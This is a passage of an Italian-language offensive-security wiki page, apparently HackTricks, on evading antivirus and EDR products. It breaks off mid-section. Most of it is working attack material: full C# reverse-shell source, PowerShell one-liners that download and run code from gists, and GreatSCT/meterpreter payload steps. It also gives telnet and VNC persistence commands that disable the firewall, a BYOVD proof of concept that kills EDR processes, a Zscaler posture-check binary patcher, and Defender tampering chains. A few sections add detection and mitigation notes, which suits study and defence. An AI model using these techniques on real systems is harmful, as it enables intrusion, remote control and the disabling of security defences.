Un modo molto efficace per impedire che i tuoi payloads ricevano il Mark of The Web è impacchettarli all'interno di una sorta di container come un ISO. Questo accade perché Mark-of-the-Web (MOTW) **non può** essere applicato ai volumi non NTFS.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che impacchetta i payloads in container di output per eludere il Mark-of-the-Web.

Esempio di utilizzo:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ecco una demo per bypassare SmartScreen impacchettando payload all'interno di file ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che permette ad applicazioni e componenti di sistema di **registrare eventi**. Tuttavia, può anche essere utilizzato dai prodotti di sicurezza per monitorare e rilevare attività dannose.

Analogamente a come AMSI viene disabilitato (bypassato), è anche possibile far sì che la funzione **`EtwEventWrite`** del processo in user space ritorni immediatamente senza registrare alcun evento. Questo si ottiene patchando la funzione in memoria per farla ritornare immediatamente, disabilitando di fatto il logging ETW per quel processo.

Puoi trovare più informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Il caricamento di binari C# in memoria è noto da tempo ed è ancora un ottimo modo per eseguire i tuoi strumenti di post-exploitation senza essere rilevati dall'AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci solo di patchare AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) forniscono già la capacità di eseguire assembly C# direttamente in memoria, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Coinvolge il **lancio di un nuovo processo sacrificial**, l'iniezione del tuo codice maligno di post-exploitation in quel nuovo processo, l'esecuzione del codice maligno e, al termine, la terminazione del nuovo processo. Questo ha sia vantaggi che svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **fuori** dal nostro processo Beacon implant. Ciò significa che se qualcosa nella nostra azione di post-exploitation va storto o viene scoperto, c'è una **probabilità molto maggiore** che il nostro **implant sopravviva.** Lo svantaggio è che si ha una **probabilità maggiore** di essere scoperti dalle **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Si tratta di iniettare il codice maligno di post-exploitation **nel proprio processo**. In questo modo puoi evitare di creare un nuovo processo che venga scansionato dall'AV, ma lo svantaggio è che se qualcosa va storto durante l'esecuzione del payload, c'è una **probabilità molto maggiore** di **perdere il tuo beacon** poiché potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi approfondire il caricamento di Assembly C#, dai un'occhiata a questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e al loro InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare Assembly C# **da PowerShell**, guarda [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e il video di S3cur3th1sSh1t (https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice maligno utilizzando altri linguaggi dando alla macchina compromessa accesso **all'ambiente dell'interprete installato sulla condivisione SMB controllata dall'attacker**.

Consentendo l'accesso ai binari dell'interprete e all'ambiente sulla condivisione SMB puoi **eseguire codice arbitrario in questi linguaggi nella memoria** della macchina compromessa.

Il repository indica: Defender scansiona ancora gli script ma sfruttando Go, Java, PHP ecc. abbiamo **più flessibilità per bypassare le firme statiche**. Test con shell reverse casuali non offuscate in questi linguaggi si sono rivelati efficaci.

## TokenStomping

Token stomping è una tecnica che permette a un attacker di **manipolare il token di accesso o un prodotto di sicurezza come un EDR o un AV**, permettendo loro di ridurne i privilegi in modo che il processo non venga terminato ma non abbia i permessi per controllare attività malevole.

Per prevenire questo Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Come descritto in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile distribuire Chrome Remote Desktop su un PC vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:
1. Scarica da https://remotedesktop.google.com/, clicca su "Set up via SSH", e poi clicca sul file MSI per Windows per scaricare l'MSI.
2. Esegui l'installer in modalità silenziosa sulla macchina vittima (richiede privilegi amministrativi): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e clicca next. Il wizard ti chiederà poi di autorizzare; clicca sul pulsante Authorize per continuare.
4. Esegui il parametro fornito con alcuni aggiustamenti: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota il parametro pin che permette di impostare il pin senza usare la GUI).

## Advanced Evasion

L'evasione è un argomento molto complicato; a volte bisogna prendere in considerazione molte diverse fonti di telemetria in un singolo sistema, quindi è praticamente impossibile rimanere completamente non rilevati in ambienti maturi.

Ogni ambiente contro cui ti scontri avrà i suoi punti di forza e di debolezza.

Ti consiglio vivamente di guardare questo talk di [@ATTL4S](https://twitter.com/DaniLJ94), per ottenere una base sulle tecniche di Advanced Evasion.

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questa è anche un'altra ottima presentazione di [@mariuszbit](https://twitter.com/mariuszbit) sull'Evasion in Depth.

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) che **rimuoverà parti del binario** fino a quando **non scopre quale parte Defender** trova come malevole e te la dividerà.\
Un altro strumento che fa la **stessa cosa è** [**avred**](https://github.com/dobin/avred) con un servizio web pubblico disponibile su [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Fino a Windows10, tutte le versioni di Windows includevano un **Telnet server** che potevi installare (come amministratore) eseguendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fai in modo che si **avvii** all'avvio del sistema ed **eseguilo** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambia la porta telnet** (stealth) e disabilita il firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vuoi i bin downloads, non il setup)

**ON THE HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Poi, sposta il binario _**winvnc.exe**_ e il file **appena** creato _**UltraVNC.ini**_ all'interno della **victim**

#### **Reverse connection**

L'**attacker** dovrebbe **eseguire sul** suo **host** il binario `vncviewer.exe -listen 5900` così sarà **preparato** a catturare una reverse **VNC connection**. Poi, nella **victim**: Avvia il daemon winvnc `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere la stealth devi evitare alcune cose

- Non avviare `winvnc` se è già in esecuzione o innescherai un [popup](https://i.imgur.com/1SROTTl.png). Verifica se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory o si aprirà [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per aiuto o innescherai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
All'interno di GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **avvia il lister** con `msfconsole -r file.rc` ed **esegui** il **xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**L'attuale defender terminerà il processo molto rapidamente.**

### Compilare la nostra reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prima C# Revershell

Compilalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### Uso del compilatore C#
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Scaricamento ed esecuzione automatici:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di obfuscatori C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Esempio: usare python per creare injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 ha sfruttato una piccola utility da console nota come **Antivirus Terminator** per disabilitare le protezioni endpoint prima di rilasciare il ransomware. Lo strumento porta il **proprio driver vulnerabile ma *signed*** e lo abusa per emettere operazioni privilegiate in kernel che anche i servizi AV PPL (Protected-Process-Light) non possono bloccare.

Punti chiave
1. **Signed driver**: Il file scritto su disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente firmato `AToolsKrnl64.sys` dall’“System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver ha una firma Microsoft valida viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La prima riga registra il driver come **kernel service** e la seconda lo avvia in modo che `\\.\ServiceMouse` diventi accessibile dallo spazio utente.
3. **IOCTLs exposed by the driver**
| Codice IOCTL | Capacità                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminare un processo arbitrario tramite PID (usato per killare i servizi Defender/EDR) |
| `0x990000D0` | Eliminare un file arbitrario su disco |
| `0x990001D0` | Unload del driver e rimozione del service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD salta completamente le protezioni user-mode; codice che esegue in kernel può aprire processi *protetti*, terminarli o manomettere oggetti kernel indipendentemente da PPL/PP, ELAM o altre feature di hardening.

Detection / Mitigation
•  Abilitare la block list di driver vulnerabili di Microsoft (`HVCI`, `Smart App Control`) in modo che Windows rifiuti di caricare `AToolsKrnl64.sys`.  
•  Monitorare la creazione di nuovi *kernel* service e generare allerta quando un driver viene caricato da una directory scrivibile da tutti o non è presente nella allow-list.  
•  Tenere d’occhio handle in user-mode verso oggetti device custom seguiti da sospette chiamate a `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** applica regole di device-posture localmente e si affida a Windows RPC per comunicare i risultati ad altri componenti. Due scelte progettuali deboli rendono possibile un bypass completo:

1. La valutazione della posture avviene **interamente client-side** (viene inviato un booleano al server).  
2. Gli endpoint RPC interni validano solo che l’eseguibile che si connette sia **signed by Zscaler** (via `WinVerifyTrust`).

Patchando quattro binari firmati su disco è possibile neutralizzare entrambi i meccanismi:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Ritorna sempre `1`, quindi ogni controllo risulta conforme |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | NOP-ed ⇒ qualsiasi processo (anche non firmato) può bindare alle pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita con `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Saltati |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Dopo aver sostituito i file originali e riavviato lo stack di servizi:

* **Tutti** i controlli di posture mostrano **verde/conforme**.
* Binaries non firmati o modificati possono aprire gli endpoint RPC named-pipe (es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso illimitato alla rete interna definita dalle policy di Zscaler.

Questo case study dimostra come decisioni di trust esclusivamente client-side e semplici controlli di firma possano essere aggirati con pochi byte patch.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) applica una gerarchia di firmatari/livelli in modo che solo processi protetti di pari o superiore livello possano manomettersi a vicenda. In ambito offensivo, se puoi avviare legittimamente un binario abilitato a PPL e controllarne gli argomenti, puoi convertire funzionalità benign (es. logging) in una primitive di scrittura vincolata, supportata da PPL, verso directory protette usate da AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Il binario di sistema firmato `C:\Windows\System32\ClipUp.exe` si auto-avvia e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Quando viene avviato come processo PPL, la scrittura del file avviene con protezione PPL.
- ClipUp non riesce a interpretare percorsi contenenti spazi; usa percorsi short 8.3 per puntare in posizioni normalmente protette.

8.3 short path helpers
- Elenca i nomi short: `dir /x` in ogni directory padre.
- Deriva il percorso short in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Avvia la LOLBIN compatibile PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (e.g., CreateProcessAsPPL).
2) Passa l'argomento log-path di ClipUp per forzare la creazione di un file in una directory AV protetta (e.g., Defender Platform). Usa nomi short 8.3 se necessario.
3) Se il binario target è normalmente aperto/bloccato dall'AV mentre è in esecuzione (e.g., MsMpEng.exe), programma la scrittura all'avvio prima che l'AV si avvii installando un servizio auto-start che venga eseguito in modo affidabile prima. Valida l'ordine di boot con Process Monitor (boot logging).
4) Al reboot la scrittura con supporto PPL avviene prima che l'AV blocchi i suoi binari, corrompendo il file target e impedendone l'avvio.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Note e vincoli
- Non puoi controllare il contenuto che ClipUp scrive oltre al posizionamento; il meccanismo è più adatto alla corruzione che a un'iniezione precisa di contenuto.
- Richiede Local admin/SYSTEM per installare/avviare un servizio e una finestra di riavvio.
- Il timing è critico: l'obiettivo non deve essere aperto; l'esecuzione a boot evita i lock sui file.

Rilevamenti
- Creazione di processi di `ClipUp.exe` con argomenti insoliti, soprattutto se parentati da launcher non standard, intorno al boot.
- Nuovi servizi configurati per auto-start di binari sospetti e che partono consistentemente prima di Defender/AV. Indagare la creazione/modifica del servizio prima dei fallimenti di avvio di Defender.
- File integrity monitoring sulle directory/binari di Defender/Platform; creazioni/modifiche inaspettate di file da processi con flag protected-process.
- ETW/EDR telemetry: cercare processi creati con `CREATE_PROTECTED_PROCESS` e uso anomalo di livelli PPL da parte di binari non-AV.

Mitigazioni
- WDAC/Code Integrity: limitare quali binari firmati possono girare come PPL e sotto quali parent; bloccare l'invocazione di ClipUp al di fuori dei contesti legittimi.
- Service hygiene: limitare la creazione/modifica di servizi auto-start e monitorare la manipolazione dell'ordine d'avvio.
- Assicurarsi che Defender tamper protection e le protezioni di early-launch siano abilitate; indagare errori di avvio che indichino corruzione dei binari.
- Considerare la disabilitazione della generazione dei nomi 8.3 sui volumi che ospitano strumenti di sicurezza se compatibile con il proprio ambiente (testare accuratamente).

Riferimenti per PPL e tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manomissione di Microsoft Defender tramite Platform Version Folder Symlink Hijack

Windows Defender sceglie la piattaforma da cui viene eseguito enumerando le sottocartelle sotto:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sottocartella con la stringa di versione lexicograficamente più alta (es., `4.18.25070.5-0`), poi avvia i processi del servizio Defender da lì (aggiornando di conseguenza i percorsi di servizio/registry). Questa selezione si fida delle voci di directory inclusi directory reparse points (symlinks). Un amministratore può sfruttare ciò per reindirizzare Defender verso un percorso scrivibile dall'attaccante e ottenere DLL sideloading o la disruption del servizio.

Precondizioni
- Amministratore locale (necessario per creare directory/symlink sotto la cartella Platform)
- Capacità di riavviare o forzare la riesecuzione della selezione della platform di Defender (riavvio del servizio all'avvio)
- Sono richiesti solo strumenti integrati (mklink)

Perché funziona
- Defender blocca le scritture nelle proprie cartelle, ma la sua selezione della platform si fida delle voci di directory e sceglie la versione lexicograficamente più alta senza validare che la destinazione risolva in un percorso protetto/affidabile.

Passo-passo (esempio)
1) Preparare una copia scrivibile della cartella platform corrente, es. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink di directory con versione superiore all'interno di Platform che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verificare che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Dovresti osservare il nuovo percorso del processo sotto `C:\TMP\AV\` e la configurazione del servizio/registry che riflette quella posizione.

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs che Defender carica dalla sua directory dell'applicazione per eseguire codice nei processi di Defender. Vedi la sezione sopra: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Rimuovere il version-symlink in modo che al prossimo avvio il percorso configurato non venga risolto e Defender non riesca ad avviarsi:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Nota che questa tecnica non fornisce un aumento dei privilegi di per sé; richiede i privilegi di amministratore.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams possono spostare l'evasione a runtime fuori dall'implant C2 e dentro il modulo target stesso agganciando la sua Import Address Table (IAT) e instradando API selezionate tramite position‑independent code (PIC) controllato dall'attaccante. Questo generalizza l'evasione oltre la piccola superficie di API che molti kit espongono (es., CreateProcessA), e estende le stesse protezioni a BOFs e DLL post‑exploitation.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Note
- Applica la patch dopo le relocations/ASLR e prima del primo utilizzo dell'import. Reflective loaders come TitanLdr/AceLdr dimostrano hooking durante DllMain del modulo caricato.
- Mantieni i wrapper piccoli e PIC-safe; risolvi la vera API tramite il valore IAT originale che hai acquisito prima di applicare la patch o tramite LdrGetProcedureAddress.
- Usa transizioni RW → RX per PIC ed evita di lasciare pagine scrivibili+eseguibili.

Call‑stack spoofing stub
